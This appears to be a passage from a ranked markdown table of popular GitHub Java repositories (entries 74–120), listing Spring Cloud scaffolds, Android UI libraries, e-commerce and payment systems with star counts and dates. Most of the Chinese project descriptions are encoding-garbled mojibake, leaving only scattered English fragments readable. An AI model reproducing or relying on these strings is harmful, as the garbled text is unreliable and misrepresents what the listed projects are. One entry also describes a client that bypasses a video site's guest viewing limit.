|74|[ityouknow/spring-cloud-examples](https://github.com/ityouknow/spring-cloud-examples)|Spring Cloud Â≠¶‰π†Ê°à‰æãÔºåÊúçÂä°ÂèëÁé∞„ÄÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÈìæË∑ØËøΩË∏™„ÄÅÊúçÂä°ÁõëÊéßÁ≠â|5.4k|Java|07/29|
|75|[knightliao/disconf](https://github.com/knightliao/disconf)|Distributed Configuration Management Platform(ÂàÜÂ∏ÉÂºèÈÖçÁΩÆÁÆ°ÁêÜÂπ≥Âè∞)|5.4k|Java|04/07|
|76|[jpush/aurora-imui](https://github.com/jpush/aurora-imui)|General IM UI components. Android/iOS/RectNative ready.  ÈÄöÁî® IM ËÅäÂ§© UI ÁªÑ‰ª∂ÔºåÂ∑≤ÁªèÂêåÊó∂ÊîØÊåÅ Android/iOS/RN„ÄÇ|5.3k|Java|09/04|
|77|[sohutv/cachecloud](https://github.com/sohutv/cachecloud)|ÊêúÁãêËßÜÈ¢ë(sohu tv)RedisÁßÅÊúâ‰∫ëÂπ≥Âè∞|5.3k|Java|10/16|
|78|[zhoutaoo/SpringCloud](https://github.com/zhoutaoo/SpringCloud)|Âü∫‰∫éSpringCloud2.1ÁöÑÂæÆÊúçÂä°ÂºÄÂèëËÑöÊâãÊû∂ÔºåÊï¥Âêà‰∫Üspring-security-oauth2„ÄÅnacos„ÄÅfeign„ÄÅsentinel„ÄÅspringcloud-gatewayÁ≠â„ÄÇÊúçÂä°Ê≤ªÁêÜÊñπÈù¢ÂºïÂÖ•elasticsearch„ÄÅskywalking„ÄÅspringboot-admin„ÄÅzipkinÁ≠âÔºåËÆ©È°πÁõÆÂºÄÂèëÂø´ÈÄüËøõÂÖ•‰∏öÂä°ÂºÄÂèëÔºåËÄå‰∏çÈúÄËøáÂ§öÊó∂Èó¥Ëä±Ë¥πÂú®Êû∂ÊûÑÊê≠Âª∫‰∏ä„ÄÇÊåÅÁª≠Êõ¥Êñ∞‰∏≠|5.2k|Java|10/13|
|79|[KunMinX/Jetpack-MVVM-Best-Practice](https://github.com/KunMinX/Jetpack-MVVM-Best-Practice)|ÊòØ ÈöæÂæó‰∏ÄËßÅ ÁöÑ Jetpack MVVM ÊúÄ‰Ω≥ÂÆûË∑µÔºÅÂú® ‰ª•ÁÆÄÈ©≠ÁπÅ ÁöÑ‰ª£Á†Å‰∏≠ÔºåÂØπ ËßÜÂõæÊéßÂà∂Âô® ‰πÉËá≥ Ê†áÂáÜÂåñÂºÄÂèëÊ®°Âºè ÂΩ¢ÊàêÊ≠£Á°Æ„ÄÅÊ∑±ÂÖ•ÁöÑÁêÜËß£ÔºÅ|5.2k|Java|10/28|
|80|[liyifeng1994/ssm](https://github.com/liyifeng1994/ssm)|ÊâãÊääÊâãÊïô‰Ω†Êï¥ÂêàÊúÄ‰ºòÈõÖSSMÊ°ÜÊû∂ÔºöSpringMVC + Spring + MyBatis|5.2k|Java|10/13|
|81|[macrozheng/mall-swarm](https://github.com/macrozheng/mall-swarm)|mall-swarmÊòØ‰∏ÄÂ•óÂæÆÊúçÂä°ÂïÜÂüéÁ≥ªÁªüÔºåÈááÁî®‰∫Ü Spring Cloud Hoxton & Alibaba„ÄÅSpring Boot 2.3„ÄÅOauth2„ÄÅMyBatis„ÄÅDocker„ÄÅElasticsearchÁ≠âÊ†∏ÂøÉÊäÄÊúØÔºåÂêåÊó∂Êèê‰æõ‰∫ÜÂü∫‰∫éVueÁöÑÁÆ°ÁêÜÂêéÂè∞Êñπ‰æøÂø´ÈÄüÊê≠Âª∫Á≥ªÁªü„ÄÇmall-swarmÂú®ÁîµÂïÜ‰∏öÂä°ÁöÑÂü∫Á°ÄÈõÜÊàê‰∫ÜÊ≥®ÂÜå‰∏≠ÂøÉ„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÁõëÊéß‰∏≠ÂøÉ„ÄÅÁΩëÂÖ≥Á≠âÁ≥ªÁªüÂäüËÉΩ„ÄÇÊñáÊ°£ÈΩêÂÖ®ÔºåÈôÑÂ∏¶ÂÖ®Â•óSpring CloudÊïôÁ®ã„ÄÇ|5.1k|Java|10/18|
|82|[febsteam/FEBS-Shiro](https://github.com/febsteam/FEBS-Shiro)|Spring Boot 2.2.5ÔºåShiro1.4.2 & Layui 2.5.5 ÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÈ¢ÑËßàÂú∞ÂùÄÔºöhttp://47.104.70.138:8080/login|5.1k|Java|10/28|
|83|[newbee-ltd/newbee-mall](https://github.com/newbee-ltd/newbee-mall)|newbee-mall È°πÁõÆÔºàÊñ∞ËúÇÂïÜÂüéÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ newbee-mall ÂïÜÂüéÁ≥ªÁªüÂèä newbee-mall-admin ÂïÜÂüéÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫é Spring Boot 2.X ÂèäÁõ∏ÂÖ≥ÊäÄÊúØÊ†àÂºÄÂèë„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÂàÜÁ±ª„ÄÅÊñ∞ÂìÅ‰∏äÁ∫ø„ÄÅÈ¶ñÈ°µËΩÆÊí≠„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÁªìÁÆó„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰∏™‰∫∫ËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´Êï∞ÊçÆÈù¢Êùø„ÄÅËΩÆÊí≠ÂõæÁÆ°ÁêÜ„ÄÅÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅÂàÜÁ±ªÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|5.1k|Java|10/15|
|84|[li-xiaojun/XPopup](https://github.com/li-xiaojun/XPopup)|üî•XPopup2.0ÁâàÊú¨ÈáçÁ£ÖÊù•Ë¢≠Ôºå2ÂÄç‰ª•‰∏äÊÄßËÉΩÊèêÂçáÔºåÂ∏¶Êù•ÂèØËßÇÁöÑÂä®ÁîªÊÄßËÉΩ‰ºòÂåñÂíå‰∫§‰∫íÁªÜËäÇÁöÑÊèêÂçáÔºÅÔºÅÔºÅÂäüËÉΩÂº∫Â§ßÔºå‰∫§‰∫í‰ºòÈõÖÔºåÂä®Áîª‰∏ùÊªëÁöÑÈÄöÁî®ÂºπÁ™óÔºÅÂèØ‰ª•Êõø‰ª£DialogÔºåPopupWindowÔºåPopupMenuÔºåBottomSheetÔºåDrawerLayoutÔºåSpinnerÁ≠âÁªÑ‰ª∂ÔºåËá™Â∏¶ÂçÅÂá†ÁßçÊïàÊûúËâØÂ•ΩÁöÑÂä®ÁîªÔºå ÊîØÊåÅÂÆåÂÖ®ÁöÑUIÂíåÂä®ÁîªËá™ÂÆö‰πâÔºÅ(Powerful and Beautiful PopupÔºåcan absolutely replace DialogÔºåPopupWindowÔºåPopupMenuÔºåBottomSheetÔºåDrawerLayoutÔºåSpinner. With built-in anima ...|5.0k|Java|10/29|
|85|[gzu-liyujiang/AndroidPicker](https://github.com/gzu-liyujiang/AndroidPicker)| „ÄêÊä±Ê≠âÔºåÊöÇÂÅúÁª¥Êä§ÔºåÊõø‰ª£ÂìÅÔºöhttps://github.com/Bigkoo/Android-PickerView„Äë ÂÆâÂçìÈÄâÊã©Âô®Á±ªÂ∫ìÔºåÂåÖÊã¨Êó•ÊúüÈÄâÊã©Âô®„ÄÅÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÂçïÈ°πÈÄâÊã©Âô®„ÄÅÂèåÈ°πÈÄâÊã©Âô®„ÄÅÂüéÂ∏ÇÂú∞ÂùÄÈÄâÊã©Âô®„ÄÅËΩ¶ÁâåÂè∑ÈÄâÊã©Âô®„ÄÅÊï∞Â≠óÈÄâÊã©Âô®„ÄÅÊòüÂ∫ßÈÄâÊã©Âô®„ÄÅÁîüËÇñÈÄâÊã©Âô®„ÄÅÈ¢úËâ≤ÈÄâÊã©Âô®„ÄÅÊñá‰ª∂ÈÄâÊã©Âô®„ÄÅÁõÆÂΩïÈÄâÊã©Âô®Á≠â‚Ä¶‚Ä¶WheelPicker/DateTimePicker/DatePicker/TimePicker/SinglePicker/NumberPicker/DoublePicker/LinkagePicker/AddressPicker/CalendarPicker/ColorPicker/FilePicker ...|4.9k|Java|10/20|
|86|[ximsfei/Android-skin-support](https://github.com/ximsfei/Android-skin-support)|Android-skin-support is an easy dynamic skin framework to use  for Android, Only one line of code to integrate it. Android Êç¢ËÇ§Ê°ÜÊû∂, ÊûÅ‰ΩéÁöÑÂ≠¶‰π†ÊàêÊú¨, ÊûÅÂ•ΩÁöÑÁî®Êà∑‰ΩìÈ™å. ""‰∏ÄË°å""‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÂÆûÁé∞Êç¢ËÇ§, ‰Ω†ÂÄºÂæóÊã•Êúâ!!!|4.9k|Java|09/03|
|87|[wuhaoyu1990/MagicCamera](https://github.com/wuhaoyu1990/MagicCamera)|Real-time Filter Camera&VideoRecorder And ImageEditor With Face Beauty For Android---ÂåÖÂê´ÁæéÈ¢úÁ≠â40‰ΩôÁßçÂÆûÊó∂Êª§ÈïúÁõ∏Êú∫ÔºåÂèØÊãçÁÖß„ÄÅÂΩïÂÉè„ÄÅÂõæÁâá‰øÆÊîπ|4.9k|Java|10/22|
|88|[yanzhenjie/SwipeRecyclerView](https://github.com/yanzhenjie/SwipeRecyclerView)|:melon: RecyclerView‰æßÊªëËèúÂçïÔºåItemÊãñÊãΩÔºåÊªëÂä®Âà†Èô§ItemÔºåËá™Âä®Âä†ËΩΩÊõ¥Â§öÔºåHeaderViewÔºåFooterViewÔºåItemÂàÜÁªÑÈªèË¥¥„ÄÇ|4.9k|Java|05/31|
|89|[changmingxie/tcc-transaction](https://github.com/changmingxie/tcc-transaction)|tcc-transactionÊòØTCCÂûã‰∫ãÂä°javaÂÆûÁé∞|4.8k|Java|10/13|
|90|[Tencent/Shadow](https://github.com/Tencent/Shadow)|Èõ∂ÂèçÂ∞ÑÂÖ®Âä®ÊÄÅAndroidÊèí‰ª∂Ê°ÜÊû∂|4.8k|Java|10/29|
|91|[TommyLemon/Android-ZBLibrary](https://github.com/TommyLemon/Android-ZBLibrary)|üî•Android MVP Âø´ÈÄüÂºÄÂèëÊ°ÜÊû∂ÔºåÂÅöÂõΩÂÜÖ „ÄåÁ§∫‰æãÊúÄÂÖ®Èù¢„Äç„ÄåÊ≥®ÈáäÊúÄËØ¶ÁªÜ„Äç„Äå‰ΩøÁî®ÊúÄÁÆÄÂçï„Äç„Äå‰ª£Á†ÅÊúÄ‰∏•Ë∞®„ÄçÁöÑ Android ÂºÄÊ∫ê UI Ê°ÜÊû∂„ÄÇ                üî•An Android MVP Framework with many demos, detailed documents, simple usages and strict codes.|4.7k|Java|09/13|
|92|[apache/incubator-dolphinscheduler](https://github.com/apache/incubator-dolphinscheduler)|Dolphin Scheduler is a distributed and easy-to-extend visual workflow scheduling platform, dedicated to solving the complex dependencies in data processing, making the scheduling system out of the box for data processing.(ÂàÜÂ∏ÉÂºèÊòìÊâ©Â±ïÁöÑÂèØËßÜÂåñÂ∑•‰ΩúÊµÅ‰ªªÂä°Ë∞ÉÂ∫¶)|4.6k|Java|10/30|
|93|[hongyangAndroid/baseAdapter](https://github.com/hongyangAndroid/baseAdapter)|Android ‰∏áËÉΩÁöÑAdapter for ListView,RecyclerView,GridViewÁ≠âÔºåÊîØÊåÅÂ§öÁßçItemÁ±ªÂûãÁöÑÊÉÖÂÜµ„ÄÇ|4.6k|Java|02/13|
|94|[wxiaoqi/Spring-Cloud-Platform](https://github.com/wxiaoqi/Spring-Cloud-Platform)|Cloud-PlatformÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫éSpring CloudÁöÑÂæÆÊúçÂä°ÂºÄÂèëÂπ≥Âè∞ÔºåÂÖ∑ÊúâÁªü‰∏ÄÊéàÊùÉ„ÄÅËÆ§ËØÅÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÖ∂‰∏≠ÂåÖÂê´ÂÖ∑Â§áÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËµÑÊ∫êÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁΩëÂÖ≥APIÁÆ°ÁêÜÁ≠âÂ§ö‰∏™Ê®°ÂùóÔºåÊîØÊåÅÂ§ö‰∏öÂä°Á≥ªÁªüÂπ∂Ë°åÂºÄÂèëÔºåÂèØ‰ª•‰Ωú‰∏∫ÂêéÁ´ØÊúçÂä°ÁöÑÂºÄÂèëËÑöÊâãÊû∂„ÄÇ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊû∂ÊûÑÊ∏ÖÊô∞ÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÁõ¥Êé•È°πÁõÆ‰∏≠‰ΩøÁî®„ÄÇÊ†∏ÂøÉÊäÄÊúØÈááÁî®Spring Boot2‰ª•ÂèäSpring Cloud GatewayÁõ∏ÂÖ≥Ê†∏ÂøÉÁªÑ‰ª∂ÔºåÂâçÁ´ØÈááÁî®vue-element-adminÁªÑ‰ª∂„ÄÇ|4.5k|Java|10/20|
|95|[SplashCodes/JAViewer](https://github.com/SplashCodes/JAViewer)|Êõ¥‰ºòÈõÖÁöÑÈ©æËΩ¶‰ΩìÈ™å|4.5k|Java|08/29|
|96|[yuanguangxin/LeetCode](https://github.com/yuanguangxin/LeetCode)|LeetCodeÂà∑È¢òËÆ∞ÂΩï‰∏éÈù¢ËØïÊï¥ÁêÜ|4.5k|Java|10/13|
|97|[527515025/springBoot](https://github.com/527515025/springBoot)|springboot Ê°ÜÊû∂‰∏éÂÖ∂ÂÆÉÁªÑ‰ª∂ÁªìÂêàÂ¶Ç jpa„ÄÅmybatis„ÄÅwebsocket„ÄÅsecurity„ÄÅshiro„ÄÅcacheÁ≠â|4.4k|Java|10/18|
|98|[zhanghai/Douya](https://github.com/zhanghai/Douya)|ÂºÄÊ∫êÁöÑ Material Design Ë±ÜÁì£ÂÆ¢Êà∑Á´ØÔºàA Material Design app for douban.comÔºâ|4.4k|Java|04/13|
|99|[youlookwhat/CloudReader](https://github.com/youlookwhat/CloudReader)|‰∫ëÈòÖÔºö‰∏ÄÊ¨æÂü∫‰∫éÁΩëÊòì‰∫ëÈü≥‰πêUIÔºå‰ΩøÁî®WanAndroid„ÄÅGank.IoÂèäÊó∂ÂÖâÁΩëapiÂºÄÂèëÁöÑÁ¨¶ÂêàGoogle Material DesignÁöÑAndroidÂÆ¢Êà∑Á´Ø„ÄÇÈ°πÁõÆÈááÂèñÁöÑÊòØMVVM-DataBindingÊû∂ÊûÑÂºÄÂèëÔºå‰∏ªË¶ÅÂåÖÊã¨ÔºöÁé©ÂÆâÂçìÂå∫„ÄÅÂπ≤Ë¥ßÂå∫ÂíåÁîµÂΩ±Âå∫‰∏â‰∏™Â≠êÊ®°Âùó„ÄÇ|4.4k|Java|10/29|
|100|[ZXZxin/ZXBlog](https://github.com/ZXZxin/ZXBlog)|ËÆ∞ÂΩïÂêÑÁßçÂ≠¶‰π†Á¨îËÆ∞(ÁÆóÊ≥ï„ÄÅJava„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÂπ∂Âèë......)|4.4k|Java|03/26|
|101|[ffay/lanproxy](https://github.com/ffay/lanproxy)|lanproxyÊòØ‰∏Ä‰∏™Â∞ÜÂ±ÄÂüüÁΩë‰∏™‰∫∫ÁîµËÑë„ÄÅÊúçÂä°Âô®‰ª£ÁêÜÂà∞ÂÖ¨ÁΩëÁöÑÂÜÖÁΩëÁ©øÈÄèÂ∑•ÂÖ∑ÔºåÊîØÊåÅtcpÊµÅÈáèËΩ¨ÂèëÔºåÂèØÊîØÊåÅ‰ªª‰Ωïtcp‰∏äÂ±ÇÂçèËÆÆÔºàËÆøÈóÆÂÜÖÁΩëÁΩëÁ´ô„ÄÅÊú¨Âú∞ÊîØ‰ªòÊé•Âè£Ë∞ÉËØï„ÄÅsshËÆøÈóÆ„ÄÅËøúÁ®ãÊ°åÈù¢...Ôºâ„ÄÇÁõÆÂâçÂ∏ÇÈù¢‰∏äÊèê‰æõÁ±ª‰ººÊúçÂä°ÁöÑÊúâËä±ÁîüÂ£≥„ÄÅTeamView„ÄÅGoToMyCloudÁ≠âÁ≠âÔºå‰ΩÜË¶Å‰ΩøÁî®Á¨¨‰∏âÊñπÁöÑÂÖ¨ÁΩëÊúçÂä°Âô®Â∞±ÂøÖÈ°ª‰∏∫Á¨¨‰∏âÊñπ‰ªòË¥πÔºåÂπ∂‰∏îËøô‰∫õÊúçÂä°ÈÉΩÊúâÂêÑÁßçÂêÑÊ†∑ÁöÑÈôêÂà∂ÔºåÊ≠§Â§ñÔºåÁî±‰∫éÊï∞ÊçÆÂåÖ‰ºöÊµÅÁªèÁ¨¨‰∏âÊñπÔºåÂõ†Ê≠§ÂØπÊï∞ÊçÆÂÆâÂÖ®‰πüÊòØ‰∏ÄÂ§ßÈöêÊÇ£„ÄÇÊäÄÊúØ‰∫§ÊµÅQQÁæ§ 1067424330|4.2k|Java|10/13|
|102|[h2pl/Java-Tutorial](https://github.com/h2pl/Java-Tutorial)|„ÄêJavaÂ∑•Á®ãÂ∏àÈù¢ËØïÂ§ç‰π†ÊåáÂçó„ÄëÊú¨‰ªìÂ∫ìÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜÔºåÊï¥Âêà‰∫Ü‰∫íËÅîÁΩë‰∏äÁöÑÂæàÂ§ö‰ºòË¥®JavaÊäÄÊúØÊñáÁ´†ÔºåÂäõÊ±ÇÊâìÈÄ†‰∏∫ÊúÄÂÆåÊï¥ÊúÄÂÆûÁî®ÁöÑJavaÂºÄÂèëËÄÖÂ≠¶‰π†ÊåáÂçóÔºåÂ¶ÇÊûúÂØπ‰Ω†ÊúâÂ∏ÆÂä©ÔºåÁªô‰∏™starÂëäËØâÊàëÂêßÔºåË∞¢Ë∞¢ÔºÅ|4.1k|Java|10/01|
|103|[jeasonlzy/ImagePicker](https://github.com/jeasonlzy/ImagePicker)|ÂÆåÂÖ®‰ªøÂæÆ‰ø°ÁöÑÂõæÁâáÈÄâÊã©ÔºåÂπ∂‰∏îÊèê‰æõ‰∫ÜÂ§öÁßçÂõæÁâáÂä†ËΩΩÊé•Âè£ÔºåÈÄâÊã©ÂõæÁâáÂêéÂèØ‰ª•ÊóãËΩ¨ÔºåÂèØ‰ª•Ë£ÅÂâ™ÊàêÁü©ÂΩ¢ÊàñÂúÜÂΩ¢ÔºåÂèØ‰ª•ÈÖçÁΩÆÂêÑÁßçÂÖ∂‰ªñÁöÑÂèÇÊï∞|4.1k|Java|10/27|
|104|[razerdp/BasePopup](https://github.com/razerdp/BasePopup)|‰∏ÄÊ¨æÈíàÂØπÁ≥ªÁªüPopupWindow‰ºòÂåñÁöÑPopupÂ∫ìÔºåÂäüËÉΩÂº∫Â§ßÔºåÊîØÊåÅËÉåÊôØÊ®°Á≥äÔºå‰ΩøÁî®ÁÆÄÂçïÔºå‰Ω†‰ºöÁà±‰∏ä‰ªñÁöÑ~|4.0k|Java|10/17|
|105|[techGay/v9porn](https://github.com/techGay/v9porn)|9*Porn Android ÂÆ¢Êà∑Á´ØÔºåÁ™ÅÁ†¥Ê∏∏ÂÆ¢ÊØèÂ§©ËßÇÁúã10Ê¨°ËßÜÈ¢ëÁöÑÈôêÂà∂ÔºåËøòÂèØ‰ª•‰∏ãËΩΩËßÜÈ¢ë|4.0k|Java|10/09|
|106|[AriaLyy/Aria](https://github.com/AriaLyy/Aria)|‰∏ãËΩΩÂèØ‰ª•ÂæàÁÆÄÂçï|4.0k|Java|10/17|
|107|[Jacksgong/JKeyboardPanelSwitch](https://github.com/Jacksgong/JKeyboardPanelSwitch)|For resolve the layout conflict when keybord & panel are switching (AndroidÈîÆÁõòÈù¢ÊùøÂÜ≤Á™Å Â∏ÉÂ±ÄÈó™Âä®Â§ÑÁêÜÊñπÊ°à)|4.0k|Java|08/18|
|108|[hustcc/JS-Sorting-Algorithm](https://github.com/hustcc/JS-Sorting-Algorithm)|‰∏ÄÊú¨ÂÖ≥‰∫éÊéíÂ∫èÁÆóÊ≥ïÁöÑ GitBook Âú®Á∫ø‰π¶Á±ç „ÄäÂçÅÂ§ßÁªèÂÖ∏ÊéíÂ∫èÁÆóÊ≥ï„ÄãÔºåÂ§öËØ≠Ë®ÄÂÆûÁé∞„ÄÇ|3.9k|Java|10/22|
|109|[YunaiV/onemall](https://github.com/YunaiV/onemall)|ËäãÈÅì mall ÂïÜÂüéÔºåÂü∫‰∫éÂæÆÊúçÂä°ÁöÑÊÄùÊÉ≥ÔºåÊûÑÂª∫Âú® B2C ÁîµÂïÜÂú∫ÊôØ‰∏ãÁöÑÈ°πÁõÆÂÆûÊàò„ÄÇÊ†∏ÂøÉÊäÄÊúØÊ†àÔºåÊòØ Spring Boot + Dubbo „ÄÇÊú™Êù•Ôºå‰ºöÈáçÊûÑÊàê Spring Cloud Alibaba „ÄÇ|3.8k|Java|10/13|
|110|[roncoo/roncoo-pay](https://github.com/roncoo/roncoo-pay)|ÈæôÊûúÊîØ‰ªòÁ≥ªÁªüÔºàroncoo-payÔºâÊòØÂõΩÂÜÖÈ¶ñÊ¨æÂºÄÊ∫êÁöÑ‰∫íËÅîÁΩëÊîØ‰ªòÁ≥ªÁªüÔºåÊã•ÊúâÁã¨Á´ãÁöÑË¥¶Êà∑‰ΩìÁ≥ª„ÄÅÁî®Êà∑‰ΩìÁ≥ª„ÄÅÊîØ‰ªòÊé•ÂÖ•‰ΩìÁ≥ª„ÄÅÊîØ‰ªò‰∫§Êòì‰ΩìÁ≥ª„ÄÅÂØπË¥¶Ê∏ÖÁªìÁÆó‰ΩìÁ≥ª„ÄÇÁõÆÊ†áÊòØÊâìÈÄ†‰∏ÄÊ¨æÈõÜÊàê‰∏ªÊµÅÊîØ‰ªòÊñπÂºè‰∏îËΩªÈáèÊòìÁî®ÁöÑÊîØ‰ªòÊî∂Ê¨æÁ≥ªÁªüÔºåÊª°Ë∂≥‰∫íËÅîÁΩë‰∏öÂä°Á≥ªÁªüÊâìÈÄöÊîØ‰ªòÈÄöÈÅìÂÆûÁé∞ÊîØ‰ªòÊî∂Ê¨æÂíå‰∏öÂä°ËµÑÈáëÁÆ°ÁêÜÁ≠âÂäüËÉΩ„ÄÇ|3.7k|Java|05/21|
|111|[2227324689/gpmall](https://github.com/2227324689/gpmall)|„ÄêÂíïÊ≥°Â≠¶Èô¢ÂÆûÊàòÈ°πÁõÆ„Äë-Âü∫‰∫éSpringBoot+DubboÊûÑÂª∫ÁöÑÁîµÂïÜÂπ≥Âè∞-ÂæÆÊúçÂä°Êû∂ÊûÑ„ÄÅÂïÜÂüé„ÄÅÁîµÂïÜ„ÄÅÂæÆÊúçÂä°„ÄÅÈ´òÂπ∂Âèë„ÄÅkafka„ÄÅElasticsearch|3.7k|Java|09/10|
|112|[alipay/SoloPi](https://github.com/alipay/SoloPi)|SoloPi Ëá™Âä®ÂåñÊµãËØïÂ∑•ÂÖ∑|3.7k|Java|09/28|
|113|[Exrick/xpay](https://github.com/Exrick/xpay)|XPay‰∏™‰∫∫ÂÖçÁ≠æÊî∂Ê¨æÊîØ‰ªòÁ≥ªÁªü ÂÆåÂÖ®ÂÖçË¥π ËµÑÈáëÁõ¥Êé•Âà∞ËææÊú¨‰∫∫Ë¥¶Âè∑ ÊîØÊåÅ ÊîØ‰ªòÂÆù ÂæÆ‰ø° QQ ‰∫ëÈó™‰ªò Êó†ÈúÄÂ§áÊ°à Êó†ÈúÄÁ≠æÁ∫¶ Êó†ÈúÄÊåÇÊú∫ÁõëÊéßAPP Êó†ÈúÄÊèí‰ª∂ Êó†ÈúÄÁ¨¨‰∏âÊñπÊîØ‰ªòSDK Êó†ÈúÄËê•‰∏öÊâßÁÖßË∫´‰ªΩËØÅ Âè™ÈúÄÊî∂Ê¨æÁ†Å ÊêûÂÆöÊîØ‰ªòÊµÅÁ®ã Áé∞Â∑≤ÊîØÊåÅÁßªÂä®Á´ØÊîØ‰ªò |3.6k|Java|07/02|
|114|[javagrowing/JGrowing](https://github.com/javagrowing/JGrowing)|Java is Growing up but not only Java„ÄÇJavaÊàêÈïøË∑ØÁ∫øÔºå‰ΩÜÂ≠¶Âà∞‰∏ç‰ªÖ‰ªÖÊòØJava„ÄÇ|3.6k|Java|10/13|
|115|[zhanglei-workspace/shopping-management-system](https://github.com/zhanglei-workspace/shopping-management-system)|ËØ•È°πÁõÆ‰∏∫Â§ö‰∏™Â∞èÈ°πÁõÆÁöÑÈõÜÂêàÔºàÊåÅÁª≠Êõ¥Êñ∞‰∏≠...Ôºâ„ÄÇÂÜÖÂÆπÁ±ª‰ººÊ∑òÂÆù„ÄÅ‰∫¨‰∏úÁ≠âÁΩëË¥≠ÁÆ°ÁêÜÁ≥ªÁªü‰ª•ÂèäÂõæ‰π¶ÁÆ°ÁêÜ„ÄÅË∂ÖÂ∏ÇÁÆ°ÁêÜÁ≠âÁ≥ªÁªü„ÄÇÁõÆÁöÑÂú®‰∫é‰æø‰∫éJavaÂàùÁ∫ßÁà±Â•ΩËÄÖÂú®Â≠¶‰π†ÂÆåÊüê‰∏ÄÈÉ®ÂàÜJavaÁü•ËØÜÂêéÊúâ‰∏Ä‰∏™ÂêàÈÄÇÁöÑÈ°πÁõÆÈîªÁÇº„ÄÅËøêÁî®ÊâÄÂ≠¶Áü•ËØÜÔºåÂÆåÂñÑÁü•ËØÜ‰ΩìÁ≥ª„ÄÇÈÄÇÁî®‰∫∫Áæ§ÔºöJavaÂü∫Á°ÄÂà∞ÂÖ•Èó®ÁöÑÁà±Â•ΩËÄÖ„ÄÇ|3.6k|Java|10/15|
|116|[chillzhuang/SpringBlade](https://github.com/chillzhuang/SpringBlade)|SpringBlade ÊòØ‰∏Ä‰∏™Áî±ÂïÜ‰∏öÁ∫ßÈ°πÁõÆÂçáÁ∫ß‰ºòÂåñËÄåÊù•ÁöÑSpringCloudÂàÜÂ∏ÉÂºèÂæÆÊúçÂä°Êû∂ÊûÑ„ÄÅSpringBootÂçï‰ΩìÂºèÂæÆÊúçÂä°Êû∂ÊûÑÂπ∂Â≠òÁöÑÁªºÂêàÂûãÈ°πÁõÆÔºåÈááÁî®Java8 APIÈáçÊûÑ‰∫Ü‰∏öÂä°‰ª£Á†ÅÔºåÂÆåÂÖ®ÈÅµÂæ™ÈòøÈáåÂ∑¥Â∑¥ÁºñÁ†ÅËßÑËåÉ„ÄÇÈááÁî®Spring Boot 2 „ÄÅSpring Cloud Hoxton „ÄÅMybatis Á≠âÊ†∏ÂøÉÊäÄÊúØÔºåÂêåÊó∂Êèê‰æõÂü∫‰∫éReactÂíåVueÁöÑ‰∏§‰∏™ÂâçÁ´ØÊ°ÜÊû∂Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÁöÑSaaSÂ§öÁßüÊà∑ÂæÆÊúçÂä°Âπ≥Âè∞„ÄÇ  ÂÆòÁΩëÔºöhttps://bladex.vip|3.6k|Java|09/14|
|117|[kekingcn/kkFileView](https://github.com/kekingcn/kkFileView)|‰ΩøÁî®spring bootÊâìÈÄ†Êñá‰ª∂ÊñáÊ°£Âú®Á∫øÈ¢ÑËßàÈ°πÁõÆËß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅdoc„ÄÅdocx„ÄÅppt„ÄÅpptx„ÄÅxls„ÄÅxlsx„ÄÅzip„ÄÅrar„ÄÅmp4Ôºåmp3‰ª•Âèä‰ºóÂ§öÁ±ªÊñáÊú¨Â¶Çtxt„ÄÅhtml„ÄÅxml„ÄÅjava„ÄÅproperties„ÄÅsql„ÄÅjs„ÄÅmd„ÄÅjson„ÄÅconf„ÄÅini„ÄÅvue„ÄÅphp„ÄÅpy„ÄÅbat„ÄÅgitignoreÁ≠âÊñá‰ª∂Âú®Á∫øÈ¢ÑËßà|3.6k|Java|10/15|
|118|[luckybilly/CC](https://github.com/luckybilly/CC)|‰∏öÁïåÈ¶ñ‰∏™ÊîØÊåÅÊ∏êËøõÂºèÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑAndroidÁªÑ‰ª∂ÂåñÂºÄÊ∫êÊ°ÜÊû∂ÔºåÊîØÊåÅË∑®ËøõÁ®ãË∞ÉÁî®„ÄÇComponentize your android project gradually.|3.6k|Java|05/27|
|119|[oldmanpushcart/greys-anatomy](https://github.com/oldmanpushcart/greys-anatomy)|JavaËØäÊñ≠Â∑•ÂÖ∑|3.5k|Java|10/13|
|120|[zzhoujay/RichText](https://github.com/zzhoujay/RichText)|AndroidÂπ≥Âè∞‰∏ãÁöÑÂØåÊñáÊú¨Ëß£ÊûêÂô®ÔºåÊîØÊåÅHtmlÂíåMarkdown|3.5k|Java|03/06|
